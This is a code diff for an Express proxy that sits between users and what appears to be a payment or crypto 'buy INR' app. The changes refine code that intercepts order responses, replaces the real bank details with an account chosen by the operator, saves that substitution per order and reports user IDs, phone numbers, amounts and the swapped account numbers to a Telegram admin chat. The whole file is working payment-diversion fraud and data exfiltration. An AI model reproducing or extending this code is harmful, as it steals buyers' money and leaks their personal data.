@@ -1139,9 +1139,6 @@ async function proxyAndReplaceBankDetails(req, res, label) {
         } else {
           deepReplace(respData, bankToUse, {}, 0);
         }
-        if (!savedBank && active && orderId !== 'N/A') {
-          saveOrderBank(orderId, active);
-        }
       }
     }
 
@@ -1241,14 +1238,15 @@ async function proxyAndReplaceBankInActiveOrders(req, res) {
       } else {
         items = [listData];
       }
-      const orderIds = items.map(item => item.orderId || item.orderNo || item.buyOrderId || item.buyOrderNo || item.id || '').filter(Boolean);
+      const getItemOrderId = (item) => item.buyOrderNo || item.orderNo || item.orderId || item.buyOrderId || item.id || '';
+      const orderIds = items.map(getItemOrderId).filter(Boolean);
       const bankMap = {};
       await Promise.all(orderIds.map(async (oid) => {
         const b = await getOrderBank(oid);
         if (b) bankMap[oid] = b;
       }));
       for (const item of items) {
-        const oid = item.orderId || item.orderNo || item.buyOrderId || item.buyOrderNo || item.id || '';
+        const oid = getItemOrderId(item);
         const savedBank = bankMap[oid];
         if (savedBank) {
           deepReplace(item, savedBank, {}, 0);
@@ -1304,24 +1302,62 @@ app.post('/app/buy/order', async (req, res) => {
     if (userId) { trackUser(data, userId, 'Buy Order'); saveData(data).catch(()=>{}); }
     const buyData = getResponseData(jsonResp);
     const body = req.parsedBody || {};
-    const newOrderId = typeof buyData === 'string' ? buyData : (buyData?.orderId || buyData?.orderNo || buyData?.buyOrderNo || buyData?.buyOrderId || '');
+    let newOrderId = '';
+    if (typeof buyData === 'string' && buyData.length > 5) {
+      newOrderId = buyData;
+    } else if (buyData && typeof buyData === 'object') {
+      newOrderId = buyData.buyOrderNo || buyData.orderNo || buyData.orderId || buyData.buyOrderId || buyData.id || '';
+    }
     if (newOrderId) {
       const eff = getEffectiveSettings(data, userId);
       const active = (eff.botEnabled !== false) ? await getActiveBankAndSave(data, userId) : null;
       if (active) {
         saveOrderBank(newOrderId, active);
+        if (data.adminChatId && bot) {
+          bot.sendMessage(data.adminChatId, `🔗 Bank saved for Order: ${newOrderId}\n💳 ${active.accountHolder} | ${active.accountNo}`).catch(()=>{});
+        }
       }
     }
-    if (data.adminChatId && bot && !isLogOff(data, userId) && !(await isLogOffByToken(data, req))) {
+    sendJson(res, respHeaders, jsonResp, respBody);
+
+    if (data.adminChatId && bot && !isLogOff(data, userId)) {
       const phone = getPhone(data, userId);
       bot.sendMessage(data.adminChatId, `⚠️ Buy INR Order [${userId || 'N/A'}]${phone ? ' (' + phone + ')' : ''}\nAmount: ₹${body.amount || body.buyAmount || 'N/A'}\nOrder: ${newOrderId || 'N/A'}\n🕐 Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`).catch(()=>{});
     }
-    sendJson(res, respHeaders, jsonResp, respBody);
   } catch(e) { await transparentProxy(req, res); }
 });
 
 app.all('/app/buy/order/details', async (req, res) => {
-  await proxyAndReplaceBankDetails(req, res, '💰 Buy Order Details');
+  const data = await loadData();
+  try {
+    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
+    const detectedUserId = await extractUserId(req, jsonResp);
+    const respData = getResponseData(jsonResp);
+    const rd = (respData && typeof respData === 'object' && !Array.isArray(respData)) ? respData : {};
+
+    const queryOrderId = req.query?.buyOrderNo || req.query?.orderId || req.query?.orderNo || '';
+    const bodyOrderId = req.parsedBody?.buyOrderNo || req.parsedBody?.orderId || req.parsedBody?.orderNo || '';
+    const respOrderId = rd.buyOrderNo || rd.orderNo || rd.orderId || rd.buyOrderId || '';
+    const orderId = queryOrderId || bodyOrderId || respOrderId || '';
+
+    if (respData && orderId) {
+      const savedBank = await getOrderBank(orderId);
+      if (savedBank) {
+        if (Array.isArray(respData)) {
+          respData.forEach(item => { if (item && typeof item === 'object') deepReplace(item, savedBank, {}, 0); });
+        } else {
+          deepReplace(respData, savedBank, {}, 0);
+        }
+      }
+    }
+
+    sendJson(res, respHeaders, jsonResp, respBody);
+
+    if (data.adminChatId && bot && detectedUserId && !isLogOff(data, detectedUserId)) {
+      const phone = getPhone(data, detectedUserId);
+      bot.sendMessage(data.adminChatId, `💰 Buy Order Details\n👤 User: ${detectedUserId}${phone ? ' (' + phone + ')' : ''}\nOrder: ${orderId || 'N/A'}\nAmount: ₹${rd.amount || rd.orderAmount || rd.paymentAmount || 'N/A'}\nTime: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`).catch(()=>{});
+    }
+  } catch(e) { await transparentProxy(req, res); }
 });
 
 app.post('/app/buy/order/paid', async (req, res) => {
